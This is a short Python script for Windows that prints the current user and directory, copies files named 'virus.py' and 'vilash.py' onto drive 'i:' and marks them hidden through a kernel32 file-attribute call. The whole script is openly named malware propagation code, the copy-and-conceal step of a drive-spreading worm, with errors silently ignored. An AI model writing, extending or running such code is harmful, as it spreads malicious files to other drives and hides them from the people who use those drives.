import os
import shutil 
import time
import ctypes


print(os.getlogin())
pwd =os.getcwd()
print(pwd)
try:
    cp_virus = shutil.copy('virus.py','i:')
    cp_vilash = shutil.copy('vilash.py','i:')
except:
    pass
ctypes.windll.kernel32.SetFileAttributesW('i:vilash.py',2)
ctypes.windll.kernel32.SetFileAttributesW('i:virus.py',2)


